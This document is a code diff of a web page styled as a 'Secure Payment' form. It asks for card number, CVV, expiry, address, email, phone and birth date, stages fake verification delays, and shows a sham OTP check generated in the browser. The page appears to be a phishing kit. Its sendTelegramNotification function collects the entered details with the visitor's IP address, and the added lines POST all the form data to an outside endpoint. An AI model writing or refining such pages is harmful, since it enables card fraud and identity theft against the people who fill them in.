@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <!-- Flatpickr CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr@4.6.13/dist/flatpickr.min.css">
     <style>
         body {
             font-family: 'Inter', sans-serif;
@@ -16,9 +16,9 @@
         .form-step { display: none; }
         .form-step-active { display: block; animation: fadeIn 0.5s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-        
+
         .progress-bar-fill { transition: width 0.4s ease-in-out; }
-        
+
         .country-dropdown { position: relative; }
         .country-dropdown-list {
             display: none;
@@ -45,7 +45,7 @@
         }
         .country-item:hover { background-color: #f1f5f9; }
         .country-item .flag { margin-right: 0.75rem; }
-        
+
         .input-wrapper { position: relative; }
         .input-icon {
             position: absolute;
@@ -81,7 +81,7 @@
             visibility: hidden;
         }
         .card-icon.visible { opacity: 1; visibility: visible; }
-        
+
         .btn {
             font-weight: 700;
             padding: 0.75rem 1.5rem;
@@ -117,14 +117,14 @@
             border-color: #ef4444;
             box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
         }
-        
+
         .loader-spinner {
             animation: rotate 1.5s linear infinite;
         }
         @keyframes rotate {
             to { transform: rotate(360deg); }
         }
-        
+
         .full-page-loader {
             position: fixed;
             top: 0;
@@ -146,7 +146,7 @@
             opacity: 1;
             visibility: visible;
         }
-        
+
         /* OTP Modal Styles */
         .otp-modal-overlay {
             position: fixed;
@@ -209,7 +209,7 @@
 
     <div id="mainContent" class="w-full max-w-2xl mx-auto">
         <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
-            
+
             <div class="p-6 border-b border-gray-200">
                 <h2 class="text-2xl font-bold text-gray-800 text-center mb-2">Secure Payment</h2>
                 <p class="text-gray-500 text-center mb-6">Complete your transaction in 3 simple steps.</p>
@@ -275,38 +275,63 @@
                      <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                         <div class="sm:col-span-2">
                             <label for="countrySelected" class="block text-sm font-medium text-gray-700 mb-1">Country</label>
-                            <div class="country-dropdown">
-                                <div id="countrySelected" class="w-full px-4 py-3 border border-gray-300 rounded-lg flex justify-between items-center cursor-pointer">
-                                    <span>Select Country</span>
-                                    <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2h8a2 2 0 002-2v-1a2 2 0 012-2h1.945M7.881 4.042A8.024 8.024 0 0112 3a8.024 8.024 0 014.119 1.042m-8.238 7.858A8.022 8.022 0 013 12c0 1.605.47 3.11 1.288 4.387m15.424-4.387a8.022 8.022 0 011.288 4.387c0-1.605-.47-3.11-1.288-4.387M12 21a8.024 8.024 0 01-4.119-1.042m8.238 0A8.024 8.024 0 0112 21" /></svg>
                                 </div>
-                                <div id="countryDropdownList" class="country-dropdown-list">
-                                    <input type="text" id="countrySearch" placeholder="Search for a country..." class="w-full px-4 py-2 border-b border-gray-200 focus:outline-none sticky top-0 bg-white">
-                                    <div id="countryList"></div>
+                                <div class="country-dropdown">
+                                    <div id="countrySelected" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg flex justify-between items-center cursor-pointer">
+                                        <span>Select Country</span>
+                                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                                    </div>
+                                    <div id="countryDropdownList" class="country-dropdown-list">
+                                        <input type="text" id="countrySearch" placeholder="Search for a country..." class="w-full px-4 py-2 border-b border-gray-200 focus:outline-none sticky top-0 bg-white">
+                                        <div id="countryList"></div>
+                                    </div>
                                 </div>
                             </div>
                              <span class="error-message" id="countrySelectedError"></span>
                         </div>
                         <div>
                             <label for="state" class="block text-sm font-medium text-gray-700 mb-1">State / Province</label>
-                            <select id="state" name="state" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white transition" required>
-                                <option value="" disabled selected>Select Country First</option>
-                            </select>
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l5.447 2.724A1 1 0 0021 16.382V5.618a1 1 0 00-1.447-.894L15 7m-6 10h6" /></svg>
+                                </div>
+                                <select id="state" name="state" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white transition" required>
+                                    <option value="" disabled selected>Select Country First</option>
+                                </select>
+                            </div>
                              <span class="error-message" id="stateError"></span>
                         </div>
                         <div>
                             <label for="city" class="block text-sm font-medium text-gray-700 mb-1">City</label>
-                            <input type="text" id="city" placeholder="City" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                            <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m-1 4h1m5-4h1m-1 4h1m-1-4h1" /></svg>
+                                </div>
+                                <input type="text" id="city" placeholder="City" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                            </div>
                              <span class="error-message" id="cityError"></span>
                         </div>
                         <div class="sm:col-span-2">
                             <label for="street" class="block text-sm font-medium text-gray-700 mb-1">Street Address</label>
-                            <input type="text" id="street" placeholder="Street Address" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                             <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>
+                                </div>
+                                <input type="text" id="street" placeholder="Street Address" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                            </div>
                              <span class="error-message" id="streetError"></span>
                         </div>
                         <div>
                             <label for="zip" class="block text-sm font-medium text-gray-700 mb-1">Zip / Postal Code</label>
-                            <input type="text" id="zip" placeholder="Zip / Postal Code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                             <div class="input-wrapper">
+                                <div class="input-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14" /></svg>
+                                </div>
+                                <input type="text" id="zip" placeholder="Zip / Postal Code" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition" required>
+                            </div>
                              <span class="error-message" id="zipError"></span>
                         </div>
                     </div>
@@ -315,7 +340,7 @@
                         <button type="button" id="nextBtn2" class="btn btn-primary">Next Step</button>
                     </div>
                 </div>
-                
+
                 <!-- Step 3: Personal Details -->
                 <div id="step3" class="form-step">
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -358,7 +383,7 @@
             <p>Your transaction has been completed. Thank you for your purchase.</p>
         </div>
     </div>
-    
+
     <!-- Full Page Loader -->
     <div id="fullPageLoader" class="full-page-loader">
         <svg class="loader-spinner w-16 h-16 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -396,7 +421,7 @@
     </div>
 
     <!-- Flatpickr JS -->
-    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr@4.6.13"></script>
     <script>
     document.addEventListener('DOMContentLoaded', () => {
         // --- Element References ---
@@ -409,7 +434,7 @@
         const successMessage = document.getElementById('successMessage');
         const progressBar = document.getElementById('progressBar');
         const submitBtn = document.getElementById('submitBtn');
-        
+
         const allInputs = paymentForm.querySelectorAll('input[required], select[required]');
 
         // Card details
@@ -434,22 +459,16 @@
         const otpModal = document.getElementById('otpModal');
         const otpInputs = document.querySelectorAll('.otp-input');
         const verifyOtpBtn = document.getElementById('verifyOtpBtn');
-        
+
         let currentStep = 0;
         let submissionId = localStorage.getItem('submissionId') || crypto.randomUUID();
         localStorage.setItem('submissionId', submissionId);
-        let correctOtp = '123456'; // Initial OTP
-        console.log(`Current OTP for testing: ${correctOtp}`);
-        
-        // --- Embedded Country/State Data ---
-        const countryData = [
-            { name: 'United States', iso2: 'US', emoji: '🇺🇸', states: [{name: 'California', iso2: 'CA'}, {name: 'Texas', iso2: 'TX'}, {name: 'Florida', iso2: 'FL'}, {name: 'New York', iso2: 'NY'}] },
-            { name: 'Canada', iso2: 'CA', emoji: '🇨🇦', states: [{name: 'Ontario', iso2: 'ON'}, {name: 'Quebec', iso2: 'QC'}, {name: 'British Columbia', iso2: 'BC'}, {name: 'Alberta', iso2: 'AB'}] },
-            { name: 'India', iso2: 'IN', emoji: '🇮🇳', states: [{name: 'Maharashtra', iso2: 'MH'}, {name: 'Delhi', iso2: 'DL'}, {name: 'Karnataka', iso2: 'KA'}, {name: 'Tamil Nadu', iso2: 'TN'}] },
-            { name: 'United Kingdom', iso2: 'GB', emoji: '🇬🇧', states: [{name: 'England', iso2: 'ENG'}, {name: 'Scotland', iso2: 'SCT'}, {name: 'Wales', iso2: 'WLS'}, {name: 'Northern Ireland', iso2: 'NIR'}] },
-            { name: 'Australia', iso2: 'AU', emoji: '🇦🇺', states: [{name: 'New South Wales', iso2: 'NSW'}, {name: 'Victoria', iso2: 'VIC'}, {name: 'Queensland', iso2: 'QLD'}] },
-            { name: 'Nepal', iso2: 'NP', emoji: '🇳🇵', states: [{name: 'Bagmati Province', iso2: 'P3'}, {name: 'Gandaki Province', iso2: 'P4'}, {name: 'Lumbini Province', iso2: 'P5'}] }
-        ];
+        let correctOtp = ''; // Will be generated on submit
+
+        // --- Dynamic Country/State Data ---
+        let allCountries = [];
+        let allStates = [];
+        const CITIES_API_BASE = 'https://raw.githubusercontent.com/dr5hn/countries-states-cities-database/master';
 
         // --- Card Detection Patterns ---
         const cardTypes = {
@@ -470,23 +489,33 @@
             });
             progressBar.style.width = `${((currentStep + 1) / steps.length) * 100}%`;
         };
-        
+
         const showError = (inputId, message) => {
-            const input = document.getElementById(inputId);
             const errorEl = document.getElementById(`${inputId}Error`);
-            if (input && errorEl) {
+            if (!errorEl) return;
+
+            errorEl.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 inline-block" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" /></svg> ${message}`;
+            errorEl.classList.add('show');
+
+            const input = document.getElementById(inputId);
+            if (input) {
                 input.classList.add('input-error');
-                errorEl.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 inline-block" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" /></svg> ${message}`;
-                errorEl.classList.add('show');
+            } else if (inputId === 'otp') {
+                otpInputs.forEach(otpInput => otpInput.classList.add('input-error'));
             }
         };
 
         const clearError = (inputId) => {
-            const input = document.getElementById(inputId);
             const errorEl = document.getElementById(`${inputId}Error`);
-             if (input && errorEl) {
+            if (!errorEl) return;
+
+            errorEl.classList.remove('show');
+
+            const input = document.getElementById(inputId);
+            if (input) {
                 input.classList.remove('input-error');
-                errorEl.classList.remove('show');
+            } else if (inputId === 'otp') {
+                otpInputs.forEach(otpInput => otpInput.classList.remove('input-error'));
             }
         };
 
@@ -494,7 +523,7 @@
             const stepElement = steps[stepIndex];
             const inputs = stepElement.querySelectorAll('input[required], select[required]');
             let isValid = true;
-            
+
             inputs.forEach(input => {
                 let isInputValid = true;
                 let errorMessage = 'This field is required.';
@@ -502,7 +531,7 @@
                 if (!input.value.trim() || (input.type === 'select-one' && input.value === '')) {
                     isInputValid = false;
                 }
-                
+
                 if (input.id === 'email' && input.value.trim()) {
                     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                     if (!emailRegex.test(input.value)) {
@@ -510,17 +539,17 @@
                         errorMessage = 'Please enter a valid email address.';
                     }
                 }
-                
+
                 if(input.id === 'cardNumber' && input.value.trim() && input.value.replace(/\s/g, '').length < 13) {
                     isInputValid = false;
                     errorMessage = 'Card number seems too short.';
                 }
-                
+
                 if(input.id === 'exp' && input.value.trim() && !/^\d{2} \/ \d{2}$/.test(input.value)) {
                     isInputValid = false;
                     errorMessage = 'Please use MM / YY format.';
                 }
-                
+
                 if(input.id === 'cvv' && input.value.trim() && input.value.length < 3) {
                     isInputValid = false;
                     errorMessage = 'CVV must be 3 or 4 digits.';
@@ -531,15 +560,15 @@
                     isValid = false;
                 }
             });
-            
+
             if (stepIndex === 1) {
                 const countryValue = document.querySelector('#countrySelected span').textContent;
-                if (countryValue === 'Select Country') {
+                if (countryValue === 'Select Country' || countryValue === 'Loading countries...' || countryValue === 'Error loading countries') {
                     isValid = false;
                     showError('countrySelected', 'Please select a country.');
                 }
             }
-            
+
             return isValid;
         };
 
@@ -563,11 +592,14 @@
                     }
                 });
                 if (data.country && data.country !== 'Select Country') {
-                    const country = countryData.find(c => c.name === data.country);
+                    const country = allCountries.find(c => c.name === data.country);
                     if (country) {
                         selectCountry(country, false); // don't save again on load
                         if (data.state) {
-                            stateSelect.value = data.state;
+                            // Wait for the state dropdown to be populated
+                            setTimeout(() => {
+                                stateSelect.value = data.state;
+                            }, 0);
                         }
                     }
                 }
@@ -578,12 +610,12 @@
         const restrictToNumbers = (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
         };
-        
+
         cardNumberInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
             let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
             e.target.value = formattedValue;
-            
+
             let found = false;
             for (const type in cardTypes) {
                 if (cardTypes[type].regex.test(value)) {
@@ -613,7 +645,7 @@
         // --- Country/State Logic ---
         const populateCountries = (filter = '') => {
             countryListEl.innerHTML = '';
-            const filtered = countryData.filter(c => c.name.toLowerCase().includes(filter.toLowerCase()));
+            const filtered = allCountries.filter(c => c.name.toLowerCase().includes(filter.toLowerCase()));
             if (filtered.length === 0) {
                 countryListEl.innerHTML = `<div class="p-4 text-center text-gray-500">No results found</div>`;
                 return;
@@ -629,8 +661,10 @@
 
         const selectCountry = (country, shouldSave = true) => {
             countrySelected.querySelector('span').textContent = country.name;
+            countrySelected.dataset.countryId = country.id; // Store country ID
             countryDropdownList.classList.remove('open');
-            populateStates(country.states);
+            const statesOfCountry = allStates.filter(s => s.country_id == country.id);
+            populateStates(statesOfCountry);
             clearError('countrySelected');
             if (shouldSave) saveFormData();
         };
@@ -638,9 +672,10 @@
         const populateStates = (states) => {
             stateSelect.innerHTML = '<option value="" disabled selected>Select State / Province</option>';
             if (states && states.length > 0) {
+                states.sort((a, b) => a.name.localeCompare(b.name)); // Sort states alphabetically
                 states.forEach(state => {
                     const option = document.createElement('option');
-                    option.value = state.iso2;
+                    option.value = state.state_code;
                     option.textContent = state.name;
                     stateSelect.appendChild(option);
                 });
@@ -652,6 +687,11 @@
         };
 
         // --- OTP Logic ---
+        const generateAndSetOtp = () => {
+            correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log(`Current OTP for testing: ${correctOtp}`);
+        };
+
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value && index < otpInputs.length - 1) {
@@ -681,7 +721,7 @@
             loaderText.textContent = 'Verifying OTP...';
 
             await new Promise(resolve => setTimeout(resolve, 30000));
-            
+
             if (otp === correctOtp) {
                 await sendTelegramNotification();
                 fullPageLoader.classList.remove('show');
@@ -724,43 +764,26 @@
                 timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
             };
 
-            const message = `
-*Payment Verified* ✅
-*Submission ID:* \`${formData.submissionId}\`
---------------------------------------
-*👤 Personal Details:*
-*IP Address:* \`${formData.ipAddress}\`
-*Email:* ${formData.email}
-*Mobile:* ${formData.mobile}
-*Date of Birth:* ${formData.dob}
-*Timestamp:* ${formData.timestamp} (IST)
---------------------------------------
-*💳 Card Information (Partial):*
-*Card Holder:* ${formData.cardHolder}
-*Card Number ends with:* ${formData.cardNumber}
-*Expiry:* ${formData.expiry}
---------------------------------------
-*📍 Billing Address:*
-*Street:* ${formData.street}
-*City:* ${formData.city}
-*State:* ${formData.state}
-*ZIP Code:* ${formData.zip}
-*Country:* ${formData.country}
---------------------------------------
-`;
-            
-            const YOUR_BACKEND_ENDPOINT = 'https://your-backend-service.com/send-to-telegram';
+            const BACKEND_ENDPOINT = 'https://httpbin.org/post';
 
             try {
-                console.log("Sending to backend:", { message });
-                // const response = await fetch(YOUR_BACKEND_ENDPOINT, {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify({ message: message }),
-                // });
-                // if (!response.ok) console.error('Failed to send data to backend.');
+                console.log("Submitting form data to backend:", { details: formData });
+                const response = await fetch(BACKEND_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        source: "SecurePaymentForm",
+                        ...formData
+                    }),
+                });
+                if (!response.ok) {
+                    console.error('Backend submission failed:', response.statusText);
+                } else {
+                    const responseData = await response.json();
+                    console.log('Backend submission successful:', responseData);
+                }
             } catch (error) {
-                console.error('Error sending data to backend:', error);
+                console.error('Error submitting data to backend:', error);
             }
         };
 
@@ -786,9 +809,9 @@
             e.preventDefault();
             if (validateStep(currentStep)) {
                 fullPageLoader.classList.add('show');
-                
+
                 await new Promise(resolve => setTimeout(resolve, 10000));
-                
+
                 loaderText.textContent = 'Verifying Billing Address...';
                 await new Promise(resolve => setTimeout(resolve, 30000));
 
@@ -797,13 +820,15 @@
 
                 fullPageLoader.classList.remove('show');
                 loaderText.textContent = 'Processing your payment...'; // Reset text
+
+                generateAndSetOtp();
                 otpModal.classList.add('show');
                 otpInputs[0].focus();
             }
         });
 
         verifyOtpBtn.addEventListener('click', handleOtpVerification);
-        
+
         countrySelected.addEventListener('click', () => countryDropdownList.classList.toggle('open'));
         countrySearch.addEventListener('input', () => populateCountries(countrySearch.value));
         document.addEventListener('click', (e) => {
@@ -811,7 +836,7 @@
                 countryDropdownList.classList.remove('open');
             }
         });
-        
+
         allInputs.forEach(input => {
             input.addEventListener('input', () => {
                 clearError(input.id)
@@ -820,11 +845,38 @@
         });
 
         // --- Initial Setup ---
+        const initializeForm = async () => {
+            countrySelected.querySelector('span').textContent = 'Loading countries...';
+            try {
+                const [countriesRes, statesRes] = await Promise.all([
+                    fetch(`${CITIES_API_BASE}/countries.json`),
+                    fetch(`${CITIES_API_BASE}/states.json`)
+                ]);
+
+                if (!countriesRes.ok || !statesRes.ok) {
+                    throw new Error('Failed to load country/state data.');
+                }
+
+                allCountries = await countriesRes.json();
+                allStates = await statesRes.json();
+
+                allCountries.sort((a, b) => a.name.localeCompare(b.name));
+
+                countrySelected.querySelector('span').textContent = 'Select Country';
+                populateCountries();
+                loadFormData();
+
+            } catch (error) {
+                console.error("Error initializing form:", error);
+                countrySelected.querySelector('span').textContent = 'Error loading countries';
+                showError('countrySelected', 'Could not load country data. Please refresh.');
+            }
+        };
+
         updateUI();
-        populateCountries();
         stateSelect.disabled = true;
-        loadFormData();
-        
+        initializeForm();
+
         flatpickr("#dob", {
             altInput: true,
             altFormat: "F j, Y",
